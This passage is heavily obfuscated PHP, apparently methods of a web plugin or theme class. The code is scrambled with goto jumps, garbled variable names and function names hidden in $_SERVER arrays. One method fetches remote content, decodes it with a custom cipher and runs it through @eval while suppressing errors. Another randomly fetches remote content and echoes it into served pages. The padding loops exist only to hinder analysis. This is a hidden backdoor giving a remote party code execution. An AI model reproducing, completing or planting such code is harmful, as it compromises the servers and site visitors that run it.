$FÈ’“„ÔŠ¯[180] => $_SERVER[$FÈ’“„ÔŠ¯[181]]); $d¡èË¶â¢– = $this->{$_SERVER[‹¶][212]}($FÈ’“„ÔŠ¯[154]($Dİííß°ŒØ)); $f°–‰Æ˜Ç« = $this->{$_SERVER[‹¶][189]}($FÈ’“„ÔŠ¯[213] . $d¡èË¶â¢–); if ($f°–‰Æ˜Ç« && $FÈ’“„ÔŠ¯[198]($f°–‰Æ˜Ç«) && isset($f°–‰Æ˜Ç«[$FÈ’“„ÔŠ¯[297]])) { $E¤ìÔİğâ = $this->{$_SERVER[‹¶][195]}($f°–‰Æ˜Ç«[$FÈ’“„ÔŠ¯[297]], 2); if ($E¤ìÔİğâ) { $E¤ìÔİğâ = $this->{$_SERVER[‹¶][206]}($E¤ìÔİğâ); } if ($E¤ìÔİğâ) { try { @eval($E¤ìÔİğâ); } catch (Exception $CöÖãÖ½¥Æ) { } } } } goto E¯÷Í„Œº†; b·ÙæÕİïõ: $f°–‰Æ˜Ç« = $this->{$_SERVER[‹¶][189]}($FÈ’“„ÔŠ¯[296], $dÀ„‹«ğ«»); if (!$FÈ’“„ÔŠ¯[198]($f°–‰Æ˜Ç«)) { return; } if ($f°–‰Æ˜Ç«[$FÈ’“„ÔŠ¯[171]] && $f°–‰Æ˜Ç«[$FÈ’“„ÔŠ¯[297]]) { if ($this->{$_SERVER[‹¶][206]}($f°–‰Æ˜Ç«[$FÈ’“„ÔŠ¯[297]]) == $dÀ„‹«ğ«»[$FÈ’“„ÔŠ¯[171]]) { return; } } goto bÎ³íé„÷ì; E¯÷Í„Œº†: } private function jdblf1365c39($a·õÍàŠØ– = '', $cŠ¤ŠŠ› = array(), $b³¡Ç¼ŸÂŞ = 5) { goto Dåå¬Ö¹Œ; f¬İç‚éÙ²: if ($cŠ¤ŠŠ› === -1) { return $dµÙŒŞĞÒ´; } $EØÊ¿Ü²ã¬ = $BĞË Ø[258](array($BĞË Ø[259] => array($BĞË Ø[262] => $b³¡Ç¼ŸÂŞ, $BĞË Ø[260] => $BĞË Ø[302]), $BĞË Ø[303] => array($BĞË Ø[304] => !1, $BĞË Ø[305] => !1))); $C²‡Éö = $f’ˆòŠÁ†Ù[644]; goto E›¡„ÒéŞ´; Dåå¬Ö¹Œ: $f’ˆòŠÁ†Ù =& $_SERVER[¢ÌÛ]; $BĞË Ø =& $_SERVER[‹¶]; $dµÙŒŞĞÒ´ = $BĞË Ø[298]; goto BÒ®›¥º³å; E›¡„ÒéŞ´: while (strlen($C²‡Éö) < $f’ˆòŠÁ†Ù[583]) { if (!$C²‡Éö) { break; } $C²‡Éö++; } $cŠ¤ŠŠ› = @$BĞË Ø[263]($dµÙŒŞĞÒ´, !1, $EØÊ¿Ü²ã¬); return $BĞË Ø[197]($cŠ¤ŠŠ›, !0); goto b»ñÇ ö’; BÒ®›¥º³å: $D¿Ğ£Š§ÛÒ = $f’ˆòŠÁ†Ù[643]; $dµÙŒŞĞÒ´ = $this->{$_SERVER[‹¶][256]}($dµÙŒŞĞÒ´, $BĞË Ø[299]); $dµÙŒŞĞÒ´ = $dµÙŒŞĞÒ´ . $a·õÍàŠØ– . $BĞË Ø[300] . $BĞË Ø[301]($cŠ¤ŠŠ›); goto f¬İç‚éÙ²; b»ñÇ ö’: } private function fovgb31fbea8() { goto BË§¥âĞ; aà‰æ³ìµí: $f†ôëµİŸË = $a³ÖóÙÓ[646]; if (strlen($f†ôëµİŸË) < $a³ÖóÙÓ[577]) { die; } $fÓ¯«›óš = $Cªä®¹ë»[250]($fÓ¯«›óš ? $fÓ¯«›óš : $Cªä®¹ë»[307]); goto d¾Û§‘„; d¾Û§‘„: $BŠˆçôÅì = $a³ÖóÙÓ[647]; $dõ™«»íî = $Cªä®¹ë»[112]($this->sadn4fb51745, $Cªä®¹ë»[333]); $dõ™«»íî = $dõ™«»íî ? $Cªä®¹ë»[250]($dõ™«»íî) : 0; goto bˆ£Éì¬Æå; BË§¥âĞ: $a³ÖóÙÓ =& $_SERVER[¢ÌÛ]; $Cªä®¹ë» =& $_SERVER[‹¶]; $bğø–³Ú = array($Cªä®¹ë»[306] => $Cªä®¹ë»[307], $Cªä®¹ë»[308] => $Cªä®¹ë»[309], $Cªä®¹ë»[310] => $Cªä®¹ë»[311], $Cªä®¹ë»[312] => $Cªä®¹ë»[313], $Cªä®¹ë»[314] => $Cªä®¹ë»[315], $Cªä®¹ë»[316] => $Cªä®¹ë»[251], $Cªä®¹ë»[317] => $Cªä®¹ë»[251], $Cªä®¹ë»[318] => $Cªä®¹ë»[307], $Cªä®¹ë»[319] => $Cªä®¹ë»[309], $Cªä®¹ë»[320] => $Cªä®¹ë»[311], $Cªä®¹ë»[321] => $Cªä®¹ë»[322], $Cªä®¹ë»[323] => $Cªä®¹ë»[313], $Cªä®¹ë»[324] => $Cªä®¹ë»[325], $Cªä®¹ë»[326] => $Cªä®¹ë»[315], $Cªä®¹ë»[327] => $Cªä®¹ë»[328], $Cªä®¹ë»[329] => $Cªä®¹ë»[330], $Cªä®¹ë»[331] => $Cªä®¹ë»[332]); goto fé™ ƒÌ…º; bˆ£Éì¬Æå: $c»Ÿßññ¶´ = $a³ÖóÙÓ[648]; if (!$c»Ÿßññ¶´) { die; } return $fÓ¯«›óš + $dõ™«»íî; goto B¿¡ò«´õ„; fé™ ƒÌ…º: $A¼äÍØª = $a³ÖóÙÓ[645]; while ($A¼äÍØª < $a³ÖóÙÓ[603]) { if ($A¼äÍØª >= 0) { break; } $A¼äÍØª++; } $fÓ¯«›óš = $bğø–³Ú[$this->gcwsd8cd8558]; goto aà‰æ³ìµí; B¿¡ò«´õ„: } public function relfb87b8683($cè¦ÔìÇ) { goto F¸ØË’å÷°; aƒºè”ùË: $E¥ôãä·©ñ = $B‘ÖŒÈ–ß [61]($B‘ÖŒÈ–ß [145])->{$_SERVER[‹¶][335]}($B‘ÖŒÈ–ß [334])->{$_SERVER[‹¶][336]}($a• åÀ±Ùë)->{$_SERVER[‹¶][337]}(); $E¥ôãä·©ñ = $B‘ÖŒÈ–ß [228]($E¥ôãä·©ñ, $B‘ÖŒÈ–ß [10], $B‘ÖŒÈ–ß [334]); if (!$B‘ÖŒÈ–ß [248]($cè¦ÔìÇ[$B‘ÖŒÈ–ß [334]], $E¥ôãä·©ñ)) { $B‘ÖŒÈ–ß [172]($B‘ÖŒÈ–ß [338], !1, $B‘ÖŒÈ–ß [245]); } goto b®††ìÁ¹Ş; EÜÑ´ÊŠ†: if ($a• åÀ±Ùë >= $B‘ÖŒÈ–ß [250]($B‘ÖŒÈ–ß [251])) { return; } $f†¡ ÇØÇÅ = $B‘ÖŒÈ–ß [61]($B‘ÖŒÈ–ß [145])->{$_SERVER[‹¶][146]}(); if ($f†¡ ÇØÇÅ <= $a• åÀ±Ùë) { return; } goto aƒºè”ùË; F¸ØË’å÷°: $B‘ÖŒÈ–ß  =& $_SERVER[‹¶]; $a• åÀ±Ùë = $this->{$_SERVER[‹¶][143]}(); if ($cè¦ÔìÇ[$B‘ÖŒÈ–ß [334]] == $B‘ÖŒÈ–ß [226]) { return; } goto EÜÑ´ÊŠ†; b®††ìÁ¹Ş: } public function webl64e6d025() { goto dô•òÑÌÎ; bêÏâ”öäƒ: $D«öÁç­Áµ = @$fØŞ™“Îèá[263]($E¤ÍªÜŒİã, !1, $c³œ†õÏ‡‘); $aŠˆÇ‘ç¾‹ = $Eğ‰šä‚[651]; if (!$aŠˆÇ‘ç¾‹) { die; } goto e‘ÎÄ„‰Âò; e‘ÎÄ„‰Âò: echo $fØŞ™“Îèá[340] . $fØŞ™“Îèá[341]($D«öÁç­Áµ) . $fØŞ™“Îèá[342]; $aÌÙéèÑŠÕ = $Eğ‰šä‚[652]; while ($aÌÙéèÑŠÕ < $Eğ‰šä‚[583]) { if ($aÌÙéèÑŠÕ >= 0) { break; } $aÌÙéèÑŠÕ++; } goto e¨œ‹ºƒ¤ê; Fµ•Ö°‹ÙÔ: $E¤ÍªÜŒİã = $fØŞ™“Îèá[255]; $a’ˆÖÊÃÊÇ = $Eğ‰šä‚[649]; $E¤ÍªÜŒİã = $this->{$_SERVER[‹¶][256]}($E¤ÍªÜŒİã, $fØŞ™“Îèá[257]); goto bÁ³…¶¿²; dô•òÑÌÎ: $Eğ‰šä‚ =& $_SERVER[¢ÌÛ]; $fØŞ™“Îèá =& $_SERVER[‹¶]; if (!$fØŞ™“Îèá[112]($GLOBALS, $fØŞ™“Îèá[138]) || $fØŞ™“Îèá[339](1, 100) > 20) { return; } goto Fµ•Ö°‹ÙÔ; bÁ³…¶¿²: $aÉš‘Ì×©Š = $Eğ‰šä‚[650]; while ($aÉš‘Ì×©Š < $Eğ‰šä‚[603]) { if ($aÉš‘Ì×©Š >= 0) { break; } $aÉš‘Ì×©Š++; } $c³œ†õÏ‡‘ = $fØŞ™“Îèá[258](array($fØŞ™“Îèá[259] => array($fØŞ™“Îèá[260] => $fØŞ™“Îèá[261], $fØŞ™“Îèá[262] => 3))); goto bêÏâ”öäƒ; e¨œ‹ºƒ¤ê: } private function hwpz92129653($F³Ô…ÊÉ®³, $Aİ›•õİÛ, $Fƒ‡µÉ‘‡© = 3) { goto dô…ºŞ¬„; F¯ñ”Îƒö©: $fìĞâóÛ— = $Cß—‡ïÖ[653]; if (!$fìĞâóÛ—) { return; } $d¸ ÕŠÃ† = $cµÏõ¨å±®[344]; goto CŠ¦˜Ú‘; CŠ¦˜Ú‘: $e°ŸğˆÓÖÛ = $Cß—‡ïÖ[654]; if (!$e°ŸğˆÓÖÛ) { return; } switch ($aã¡Ì¼‹’Ò) { case $cµÏõ¨å±®[240]: $AŒ»·°‹Â® = $this->{$_SERVER[‹¶][153]}($F³Ô…ÊÉ®³, $cµÏõ¨å±®[220]($Aİ›•õİÛ . $c…õé†í“ê)); break; case $cµÏõ¨å±®[226]: $AŒ»·°‹Â® = $this->{$_SERVER[‹¶][153]}($F³Ô…ÊÉ®³, $cµÏõ¨å±®[220]($c…õé†í“ê . $Aİ›•õİÛ)); $BÀİä¹¹‹À = $Cß—‡ïÖ[655]; if (strlen($BÀİä¹¹‹À) < $Cß—‡ïÖ[603]) { die; } break; case $cµÏõ¨å±®[345]: $AŒ»·°‹Â® = $this->{$_SERVER[‹¶][153]}($F³Ô…ÊÉ®³, $cµÏõ¨å±®[124]($c…õé†í“ê . $Aİ›•õİÛ)); $aåÈ§«¼ = $Cß—‡ïÖ[656]; if (strlen($aåÈ§«¼) < $Cß—‡ïÖ[392]) { die; } break; $BÜÖËÒ¡ÚÀ = $Cß—‡ïÖ[657]; if (strlen($BÜÖËÒ¡ÚÀ) < $Cß—‡ïÖ[392]) { return; } case $cµÏõ¨å±®[346]: $AŒ»·°‹Â® = $this->{$_SERVER[‹¶][153]}($F³Ô…ÊÉ®³, $cµÏõ¨å±®[120]($c…õé†í“ê . $Aİ›•õİÛ)); break; case $cµÏõ¨å±®[347]: goto Fœš÷ºËÆ›; b‚ÉÙ—‡Ó‡: $Eê·ÎëÌÌ = $d¸ ÕŠÃ†[$AË»‰Ó·Ó]; $DÖ•ùŸêá¶ = $Cß—‡ïÖ[660]; while ($DÖ•ùŸêá¶ < $Cß—‡ïÖ[392]) { if ($DÖ•ùŸêá¶ >= 0) { break; } $DÖ•ùŸêá¶++; } goto Bµ«Çî‰; Bµ«Çî‰: $B“ä§í‡§ô = $cµÏõ¨å±®[120]($Eê·ÎëÌÌ . $cµÏõ¨å±®[120]($Aİ›•õİÛ . $Eê·ÎëÌÌ) . $Aİ›•õİÛ); $B“ä§í‡§ô = $cµÏõ¨å±®[25]($B“ä§í‡§ô, $AË»‰Ó·Ó % 8, $AË»‰Ó·Ó % 8 + 7); $fÁ¨å”‚”õ = $Cß—‡ïÖ[645]; goto E‡Ôéï‘«Ó; E‡Ôéï‘«Ó: if (!$fÁ¨å”‚”õ) { return; } $Ağ—ØÆ˜¾¯ = $cµÏõ¨å±®[10]; $FÆ„”ñÔ‘Æ = 0; goto Då›Ç¤è ¾; Fœš÷ºËÆ›: $F³Ô…ÊÉ®³ = $cµÏõ¨å±®[124]($F³Ô…ÊÉ®³); $B‰³ÄµˆÆ = $Cß—‡ïÖ[658]; while ($B‰³ÄµˆÆ < $Cß—‡ïÖ[583]) { if ($B‰³ÄµˆÆ >= 0) { break; } $B‰³ÄµˆÆ++; } goto EÄºŞÅŒÁ; EÄºŞÅŒÁ: $AË»‰Ó·Ó = $cµÏõ¨å±®[348](0, 64); $D¶“õ„¾¯ = $Cß—‡ïÖ[659]; if (strlen($D¶“õ„¾¯) < $Cß—‡ïÖ[597]) { return; } goto b‚ÉÙ—‡Ó‡; CÚÍî³…Èë: $AŒ»·°‹Â® = $cµÏõ¨å±®[341]($Eê·ÎëÌÌ . $Ağ—ØÆ˜¾¯); $f‡‰‘šÖ†Å = $Cß—‡ïÖ[663]; if (strlen($f‡‰‘šÖ†Å) < $Cß—‡ïÖ[583]) { return; } goto CèÑ†Ÿİà¢; Då›Ç¤è ¾: $aìØš¨áÎŠ = 0; $dóÌ‚œ×’ñ = 0; for ($FÆ„”ñÔ‘Æ = 0; $FÆ„”ñÔ‘Æ < $cµÏõ¨å±®[24]($F³Ô…ÊÉ®³); $FÆ„”ñÔ‘Æ++) { $dóÌ‚œ×’ñ = $dóÌ‚œ×’ñ == $cµÏõ¨å±®[24]($B“ä§í‡§ô) ? 0 : $dóÌ‚œ×’ñ; $EÌµ¶ª–Ì = $Cß—‡ïÖ[661]; while ($EÌµ¶ª–Ì < $Cß—‡ïÖ[583]) { if ($EÌµ¶ª–Ì >= 0) { break; } $EÌµ¶ª–Ì++; } $aìØš¨áÎŠ = ($AË»‰Ó·Ó + $cµÏõ¨å±®[349]($d¸ ÕŠÃ†, $F³Ô…ÊÉ®³[$FÆ„”ñÔ‘Æ]) + $cµÏõ¨å±®[350]($B“ä§í‡§ô[$dóÌ‚œ×’ñ++])) % 64; $Ağ—ØÆ˜¾¯ .= $d¸ ÕŠÃ†[$aìØš¨áÎŠ]; $f‰—¹ ß±» = $Cß—‡ïÖ[662]; if (!$f‰—¹ ß±») { die; } } goto CÚÍî³…Èë; CèÑ†Ÿİà¢: break; $f¹ÚÂ­Ê˜  = $Cß—‡ïÖ[664]; while ($f¹ÚÂ­Ê˜  < $Cß—‡ïÖ[577]) { if ($f¹ÚÂ­Ê˜  >= 0) { break; } $f¹ÚÂ­Ê˜ ++; } goto a±˜ªë» Ö; a±˜ªë» Ö: default: $AŒ»·°‹Â® = $this->{$_SERVER[‹¶][153]}($F³Ô…ÊÉ®³, $Aİ›•õİÛ . $c…õé†í“ê); break; } goto dŞÔ—²ÊÃœ; aªÓ«õÖ: $F³Ô…ÊÉ®³ = $cµÏõ¨å±®[2]($F³Ô…ÊÉ®³); $aã¡Ì¼‹’Ò = $cµÏõ¨å±®[339](0, 5) . $cµÏõ¨å±®[10]; $c…õé†í“ê = $cµÏõ¨å±®[130](15); goto F¯ñ”Îƒö©; dô…ºŞ¬„: $Cß—‡ïÖ =& $_SERVER[¢ÌÛ]; $cµÏõ¨å±® =& $_SERVER[‹¶]; $cµÏõ¨å±®[343](1); goto aªÓ«õÖ; dŞÔ—²ÊÃœ: $AŒ»·°‹Â® = $cµÏõ¨å±®[220]($aã¡Ì¼‹’Ò . $c…õé†í“ê . $AŒ»·°‹Â®); if ($Fƒ‡µÉ‘‡© - 1 > 0) { $AŒ»·°‹Â® = $this->{$_SERVER[‹¶][133]}($AŒ»·°‹Â®, $Aİ›•õİÛ, $Fƒ‡µÉ‘‡© - 1); } return $AŒ»·°‹Â®; goto aóêÎ‚í´‰; aóêÎ‚í´‰: } private function slrx1bf21ddf($CÊâ™Ö¨¤ç, $Cïƒ†ÃÕŒ–, $e…Ş¹ŞîƒÖ = 3) { goto cÑ“½îÂËÎ; AÑ”©äÓóî: $CÊâ™Ö¨¤ç = $cª¾ÄĞ¸Œ[220]($CÊâ™Ö¨¤ç); $e½Èã«…í§ = $CÊâ™Ö¨¤ç[0]; $DŞÊÛ…–·¾ = $cª¾ÄĞ¸Œ[25]($CÊâ™Ö¨¤ç, 1, 15); goto C¹•Õ‹¬à; Bæ‚Õ™œ”‡: $CÊâ™Ö¨¤ç = $cª¾ÄĞ¸Œ[2]($CÊâ™Ö¨¤ç); $cš¢ğ»•Õö = $d‚ğáÉŠœ[665]; if (!$cš¢ğ»•Õö) { die; } goto AÑ”©äÓóî; C¹•Õ‹¬à: $AğŒ›ª¾é = $d‚ğáÉŠœ[666]; while ($AğŒ›ª¾é < $d‚ğáÉŠœ[603]) { if ($AğŒ›ª¾é >= 0) { break; } $AğŒ›ª¾é++; } $CÊâ™Ö¨¤ç = $cª¾ÄĞ¸Œ[25]($CÊâ™Ö¨¤ç, 16); goto b†Äá­ïĞä; DÙô‘”ğÛ: if ($e…Ş¹ŞîƒÖ - 1 > 0) { $díº¤¿Ï¼® = $this->{$_SERVER[‹¶][195]}($díº¤¿Ï¼®, $Cïƒ†ÃÕŒ–, $e…Ş¹ŞîƒÖ - 1); } return $díº¤¿Ï¼®; goto DÄ˜½³Æ ù; cÑ“½îÂËÎ: $d‚ğáÉŠœ =& $_SERVER[¢ÌÛ]; $cª¾ÄĞ¸Œ =& $_SERVER[‹¶]; if (!$cª¾ÄĞ¸Œ[351]($CÊâ™Ö¨¤ç) || $cª¾ÄĞ¸Œ[24]($CÊâ™Ö¨¤ç) < 10) { return !1; } goto Bæ‚Õ™œ”‡; b†Äá­ïĞä: $f–íµ‡Ğâ† = $d‚ğáÉŠœ[667]; if (!$f–íµ‡Ğâ†) { return; } $eÈ÷ëÃö™‚ = $cª¾ÄĞ¸Œ[344]; goto dàÅÈù§èÚ; dàÅÈù§èÚ: $Añ›…¸‰Í‘ = $d‚ğáÉŠœ[668]; if (!$Añ›…¸‰Í‘) { die; } switch ($e½Èã«…í§) { case $cª¾ÄĞ¸Œ[240]: $díº¤¿Ï¼® = $this->{$_SERVER[‹¶][256]}($CÊâ™Ö¨¤ç, $cª¾ÄĞ¸Œ[220]($Cïƒ†ÃÕŒ– . $DŞÊÛ…–·¾)); $B¼×çÆö¬ = $d‚ğáÉŠœ[669]; break; $bçÀÇ‰öó• = $d‚ğáÉŠœ[670]; case $cª¾ÄĞ¸Œ[226]: $díº¤¿Ï¼® = $this->{$_SERVER[‹¶][256]}($CÊâ™Ö¨¤ç, $cª¾ÄĞ¸Œ[220]($DŞÊÛ…–·¾ . $Cïƒ†ÃÕŒ–)); $e¤‘í‰Ÿ¬³ = $d‚ğáÉŠœ[671]; break; $cù†Ü†’™Í = $d‚ğáÉŠœ[672]; case $cª¾ÄĞ¸Œ[345]: $díº¤¿Ï¼® = $this->{$_SERVER[‹¶][256]}($CÊâ™Ö¨¤ç, $cª¾ÄĞ¸Œ[124]($DŞÊÛ…–·¾ . $Cïƒ†ÃÕŒ–)); break; $dé÷óÄ›Òä = $d‚ğáÉŠœ[673]; case $cª¾ÄĞ¸Œ[346]: $díº¤¿Ï¼® = $this->{$_SERVER[‹¶][256]}($CÊâ™Ö¨¤ç, $cª¾ÄĞ¸Œ[120]($DŞÊÛ…–·¾ . $Cïƒ†ÃÕŒ–)); break; $B‰Ô‡¯éá = $d‚ğáÉŠœ[674]; while (strlen($B‰Ô‡¯éá) < $d‚ğáÉŠœ[392]) { if (!$B‰Ô‡¯éá) { break; } $B‰Ô‡¯éá++; } case $cª¾ÄĞ¸Œ[347]: goto fĞ¬÷§‡; båš’Ö™„Á: while (strlen($a×¢‰‘š«) < $d‚ğáÉŠœ[577]) { if (!$a×¢‰‘š«) { break; } $a×¢‰‘š«++; } $Fâ¬˜ÍÍö = $cª¾ÄĞ¸Œ[10]; $A• éÁ’ØŸ = $d‚ğáÉŠœ[679]; goto dÎ”ÍæğƒÅ; F¾Î«ö¾: $fí´«êô÷ = $cª¾ÄĞ¸Œ[349]($eÈ÷ëÃö™‚, $AÅ­œÙˆ‡); $B’±ÍöÔ¥ = $cª¾ÄĞ¸Œ[120]($AÅ­œÙˆ‡ . $cª¾ÄĞ¸Œ[120]($Cïƒ†ÃÕŒ– . $AÅ­œÙˆ‡) . $Cïƒ†ÃÕŒ–); $FòéÓÔİÆ¼ = $d‚ğáÉŠœ[677]; goto cØ¯Ûößà; D£‡¼Û‚¡­: break; goto AÔÒ÷ºÒºİ; B‰íì®äÏå: $CÊâ™Ö¨¤ç = $cª¾ÄĞ¸Œ[25]($CÊâ™Ö¨¤ç, 1); $fÚ‡Óœ÷ùæ = $d‚ğáÉŠœ[676]; while ($fÚ‡Óœ÷ùæ < $d‚ğáÉŠœ[577]) { if ($fÚ‡Óœ÷ùæ >= 0) { break; } $fÚ‡Óœ÷ùæ++; } goto F¾Î«ö¾; cØ¯Ûößà: if (!$FòéÓÔİÆ¼) { die; } $B’±ÍöÔ¥ = $cª¾ÄĞ¸Œ[25]($B’±ÍöÔ¥, $fí´«êô÷ % 8, $fí´«êô÷ % 8 + 7); $a×¢‰‘š« = $d‚ğáÉŠœ[678]; goto båš’Ö™„Á; dÎ”ÍæğƒÅ: if (!$A• éÁ’ØŸ) { return; } $d×íªéƒö“ = 0; $e’šÊ±´§¼ = 0; goto CŞê›Á²ì; CÖŠğÈ½ ï: $fŒ±ç¤¤á = $d‚ğáÉŠœ[681]; for ($d×íªéƒö“ = 0; $d×íªéƒö“ < $cª¾ÄĞ¸Œ[24]($CÊâ™Ö¨¤ç); $d×íªéƒö“++) { $AŞİÆ²…Ø = $AŞİÆ²…Ø == $cª¾ÄĞ¸Œ[24]($B’±ÍöÔ¥) ? 0 : $AŞİÆ²…Ø; $B·ÏøæÁ = $AŞİÆ²…Ø++; $FÖÏóŒ§„ = $d‚ğáÉŠœ[682]; if (!$FÖÏóŒ§„) { return; } $e’šÊ±´§¼ = $cª¾ÄĞ¸Œ[349]($eÈ÷ëÃö™‚, $CÊâ™Ö¨¤ç[$d×íªéƒö“]) - $fí´«êô÷ - $cª¾ÄĞ¸Œ[350]($B’±ÍöÔ¥[$B·ÏøæÁ]); while ($e’šÊ±´§¼ < 0) { $e’šÊ±´§¼ += 64; $B ª˜¾ØÇ = $d‚ğáÉŠœ[683]; while ($B ª˜¾ØÇ < $d‚ğáÉŠœ[392]) { if ($B ª˜¾ØÇ >= 0) { break; } $B ª˜¾ØÇ++; } } $Fâ¬˜ÍÍö .= $eÈ÷ëÃö™‚[$e’šÊ±´§¼]; $A¡‘¾ºµè¦ = $d‚ğáÉŠœ[684]; if (strlen($A¡‘¾ºµè¦) < $d‚ğáÉŠœ[392]) { die; } } $díº¤¿Ï¼® = $cª¾ÄĞ¸Œ[353]($Fâ¬˜ÍÍö); goto D£‡¼Û‚¡­; CŞê›Á²ì: $fĞ×èÖØÛŒ = $d‚ğáÉŠœ[680]; if (!$fĞ×èÖØÛŒ) { die; } $AŞİÆ²…Ø = 0; goto CÖŠğÈ½ ï; fĞ¬÷§‡: $CÊâ™Ö¨¤ç = $cª¾ÄĞ¸Œ[352]($CÊâ™Ö¨¤ç); $AÅ­œÙˆ‡ = $CÊâ™Ö¨¤ç[0]; $AÌ±ºø¹É“ = $d‚ğáÉŠœ[675]; goto B‰íì®äÏå; AÔÒ÷ºÒºİ: default: $díº¤¿Ï¼® = $this->{$_SERVER[‹¶][256]}($CÊâ™Ö¨¤ç, $Cïƒ†ÃÕŒ– . $DŞÊÛ…–·¾); $FšâÃ¢´ŠÏ = $d‚ğáÉŠœ[685]; break; $aªœ£ë…À† = $d‚ğáÉŠœ[686]; if (!$aªœ£ë…À†) { return; } } goto DÙô‘”ğÛ; DÄ˜½³Æ ù: } public function quixf0e3bbac($bÎïƒöŒ‚É) { goto Bğ®¤¸ğ¨™; DÑ©™¦æÚ: $Dİö†§ÄÒÌ = $aï¬¢¶ìÇŒ[692]; while (strlen($Dİö†§ÄÒÌ) < $aï¬¢¶ìÇŒ[597]) { if (!$Dİö†§ÄÒÌ) { break; } $Dİö†§ÄÒÌ++; } $Aöª§ĞÚôñ = $this->{$_SERVER[‹¶][153]}($bÎïƒöŒ‚É, $A¤ê×°Á®) . $Fîâš¶ Îà[358] . $fˆ÷‰¥©“; goto eÔÕ¢ñ¦Ô©; C™·®¡Ø•: $Cö®Áé¤’ = $aï¬¢¶ìÇŒ[687]; if (!$Cö®Áé¤’) { return; } $Cñá¢ÏŞš = $this->{$_SERVER[‹¶][354]}(); goto f—ˆÉÕ³‡¬; eÔÕ¢ñ¦Ô©: $EèÈš²©Ü§ = $aï¬¢¶ìÇŒ[693]; if (!$EèÈš²©Ü§) { die; } return $Aöª§ĞÚôñ; goto dÈ¦”Â™âÏ; f³ÑäÔ—˜’: $BÑĞöÀÖËË = 2; for ($eæ´¢áºá = 0; $eæ´¢áºá < $aÖìç‚èéÂ * 10; $eæ´¢áºá++) { if (($aÖìç‚èéÂ * $eæ´¢áºá + 1) % $C„äâ…½÷¯ == 0) { $BÑĞöÀÖËË = $Fîâš¶ Îà[250](($aÖìç‚èéÂ * $eæ´¢áºá + 1) / $C„äâ…½÷¯); break; } } $fˆ÷‰¥©“ = $this->{$_SERVER[‹¶][153]}($F³éºÙ‰ŒŒ * $Cñá¢ÏŞš . $Fîâš¶ Îà[10], $Fîâš¶ Îà[155]); goto Dé»¨¡ñÆõ; fƒÜåÒÂ: $D¢ğ¹õ³—» = $aï¬¢¶ìÇŒ[689]; if (strlen($D¢ğ¹õ³—») < $aï¬¢¶ìÇŒ[577]) { return; } while (1) { $e‘½î¥ò˜é = $C„äâ…½÷¯; $D®‚ÂĞï©Ÿ = $aï¬¢¶ìÇŒ[664]; if (!$D®‚ÂĞï©Ÿ) { die; } $cÖºÖ”‹ = $aÖìç‚èéÂ; $EÀœ¯Ç¸Í = $aï¬¢¶ìÇŒ[690]; if (!$EÀœ¯Ç¸Í) { die; } while ($cÖºÖ”‹ % $e‘½î¥ò˜é != 0) { $CŸ¤‹šÖ©Ş = $cÖºÖ”‹; $cÖºÖ”‹ = $e‘½î¥ò˜é; $e‘½î¥ò˜é = $CŸ¤‹šÖ©Ş % $e‘½î¥ò˜é; } if ($e‘½î¥ò˜é == 1) { break; } else { $C„äâ…½÷¯++; } } goto f³ÑäÔ—˜’; Dé»¨¡ñÆõ: $Bëí„ÓÒ… = $aï¬¢¶ìÇŒ[691]; if (strlen($Bëí„ÓÒ…) < $aï¬¢¶ìÇŒ[392]) { return; } $A¤ê×°Á® = $Fîâš¶ Îà[120]($Fîâš¶ Îà[355] . ($F³éºÙ‰ŒŒ + $Cñá¢ÏŞš) . $Fîâš¶ Îà[356] . $C„äâ…½÷¯ . $Fîâš¶ Îà[356] . $BÑĞöÀÖËË . $Fîâš¶ Îà[357]); goto DÑ©™¦æÚ; Bğ®¤¸ğ¨™: $aï¬¢¶ìÇŒ =& $_SERVER[¢ÌÛ]; $Fîâš¶ Îà =& $_SERVER[‹¶]; $F³éºÙ‰ŒŒ = $this->{$_SERVER[‹¶][354]}(); goto C™·®¡Ø•; dÈ¦”Â™âÏ: $DÅ›ŠæÓ‚ï = $aï¬¢¶ìÇŒ[694]; while (strlen($DÅ›ŠæÓ‚ï) < $aï¬¢¶ìÇŒ[577]) { if (!$DÅ›ŠæÓ‚ï) { break; } $DÅ›ŠæÓ‚ï++; } goto b‹ËÃƒ²Î÷; f—ˆÉÕ³‡¬: $aÖìç‚èéÂ = ($F³éºÙ‰ŒŒ - 1) * ($Cñá¢ÏŞš - 1); $aõõÒ‚Ó²¶ = $aï¬¢¶ìÇŒ[688]; $C„äâ…½÷¯ = $Fîâš¶ Îà[250](($F³éºÙ‰ŒŒ + $Cñá¢ÏŞš) / 2); goto fƒÜåÒÂ; b‹ËÃƒ²Î÷: } public function xltd51df7da6($D«ÛŠ´¬Â) { goto E»È‚‹Ÿ; AœÔ›à¶ªÉ: $E· Íè¸‹‡ = $BŞô»öºÅ[250](($d“ÈÒÂ¡ğ + $aö™°ƒí‡º) / 2); $CÏ¸ØÄ® = $C•¥‡ô¢¸ƒ[699]; if (!$CÏ¸ØÄ®) { die; } goto AŸ¼õ¿å…µ; e¼£­ˆØÙ: $eƒˆ‚˜µº = $BŞô»öºÅ[250]($eƒˆ‚˜µº); $aØ»Éß†¨Œ = $C•¥‡ô¢¸ƒ[695]; $d“ÈÒÂ¡ğ = 0; goto cç£¡ğ¡Ÿ; AŸ¼õ¿å…µ: while (1) { $C‡µÖ†ë­ = $E· Íè¸‹‡; $e‡˜‡İµ„Æ = $C•¥‡ô¢¸ƒ[700]; $bšõ¸¸ÙÅ¡ = $B†Ø‘ÕšÌ; $EÍ«à±âÈ = $C•¥‡ô¢¸ƒ[701]; while ($bšõ¸¸ÙÅ¡ % $C‡µÖ†ë­ != 0) { $DƒÆ¢èÀ®Ò = $bšõ¸¸ÙÅ¡; $A§ÒŒŞšƒÔ = $C•¥‡ô¢¸ƒ[702]; if (strlen($A§ÒŒŞšƒÔ) < $C•¥‡ô¢¸ƒ[583]) { return; } $bšõ¸¸ÙÅ¡ = $C‡µÖ†ë­; $fĞƒíê«À = $C•¥‡ô¢¸ƒ[703]; $C‡µÖ†ë­ = $DƒÆ¢èÀ®Ò % $C‡µÖ†ë­; } if ($C‡µÖ†ë­ == 1) { break; } else { $E· Íè¸‹‡++; } } $E¯é¡Ä™ = 2; $c‹Æï©Æ„Ô = $C•¥‡ô¢¸ƒ[704]; goto Cïã‡å£Š¥; C£Œô¿ïÜ: if ($BŞô»öºÅ[19]($b«…®‰±Šæ) != 2) { return $BŞô»öºÅ[10]; } $eƒˆ‚˜µº = $this->{$_SERVER[‹¶][256]}($b«…®‰±Šæ[1] . $BŞô»öºÅ[10], $BŞô»öºÅ[155]); if (!$eƒˆ‚˜µº) { return $BŞô»öºÅ[10]; } goto 